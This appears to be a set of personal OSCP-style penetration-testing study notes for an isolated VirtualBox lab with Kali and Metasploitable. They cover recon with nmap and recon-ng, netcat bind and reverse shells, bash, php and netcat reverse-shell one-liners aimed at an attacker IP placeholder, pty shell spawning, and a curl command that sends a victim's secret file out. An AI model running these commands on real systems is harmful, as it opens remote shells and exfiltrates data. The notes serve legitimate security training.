
[...back](../0-landing-ncsaoscp.md)

# lab setup

```
> VirtualBox hosting Kali (attacker) and Metasploitable 2 (or 3 as  target)

> metasploitable 2 vm hard disk
> > https://downloads.metasploit.com/data/metasploitable/metasploitable-linux-2.0.0.zip
> > u:::p = msfadmin:::msfadmin

> vm network setting
> > kali: {adapter1:NAT, adapter2:host-only}
> > metasploitable: {adapter1:host-only}

> test vm network
> > `ip r` <<< note ip both vms
> > `ping -c 3 ip`

> scan port
> > `nmap -vv -A -O 192.168.56.x`

> ssh to kali
> > `sudo service ssh start`
```

[more about `nmap -vv -A -O`](../../more/nmap-basic.md)
[more about starting ssh service](../../more/ssh-service-start.md) 

---

# tools

```
zenmap, recon-ng
> try zenmap to target
> try recon-ng to target
> > > `marketplace search`
> > > `marketplace install recon/domains-hosts/hackertarget`
> > > `modules load recon/domains-hosts/hackertarget`
> > > options set SOURCE rapid7.com
> > > run
> > > show hosts
```

```
netcat

> binding (target passive listener) vs reverse (attacker passive listener)

> > passive vs active listener
> > > `nc -nvlp <port>` = passive = always start the attack sequence
> > > `nc <ip> <port>` = active = follow
 
> > target executes payload (e.g. give shell)
> > > windows shell: `-e cmd.exe`
> > > unix shell: `-e /bin/bash`
> > > upload/download: `> file.txt` or `< file.txt`

> > attack sequence (assume shell payload)
> > > binding (target -> attacker)
> > > > target: `nc -nvlp 4444 -e /bin/sh`
> > > > attacker: `nc <iptarget> 4444`

> > > reverse (attacker -> target)
> > > > attacker: `nc -nvlp 4444`
> > > > target: `nc <ipattacker> 4444 -e /bin/sh`
```

[more about binding vs reverse](more/binding-vs-reverse.md)
[more about recon-ng](../../more/recon-ng.md)
[more about binding shell exercise](../../more/bindingshell-exercise.md)

---

# reverse shell

```
netcat-reverse shell
> `nc <ipattacker> <port> -e /bin/sh`

bash-reverse shell
> `bash -i >& /dev/tcp/<ipattacker>/<port> 0>&1`

php-reverse shell
> `php -r '$sock=fsockopen("<ipattacker>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'`

perl-reverse shell
> perl -e ...

python-reverse shell
> python -c ...

ruby, netcat, powershell
```

[more at pentestmonkey reverse shell cheat sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
[reverse shell generator online](https://www.revshells.com/)

---

# spawn shell with python

```
python -c 'import pty;pty.spawn("/bin/bash")'
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin?/sbin:/bin
```

[more about spawn shell](../../more/spawn-shell.md)

---

# python http server

```
mkdir http.server
cd http.server
echo test > test.txt
python -m http.server 8000

---

(victim downloads from attacker)
wget http://<ipattacker>:8000/test.txt
```

note: secured server is isolated

---

# exercise drills

```
> practice this until it's a reflex
> try to remember commands (close book) if applicable
```

> recon {nmap, zenmap, random-ng}
> {bind, reverse} x {shell, upload, download} = 6 cases total
> > if shell, followed by spawn shell + reset path if applicable
> > if shell, also make yourself familiar more with different shell-giving commands such as python  and bash-tcp (suggest: try reverse shell generator tools to explore different command tools)
> python http server x {upload, download}
> > for upload from attacker to victim, try this
```
curl -X POST -F 'file=@/path/on/victim/to/secret.txt' http://<ipattacker>:8000/upload
```

---

[...back](../0-landing-ncsaoscp.md)
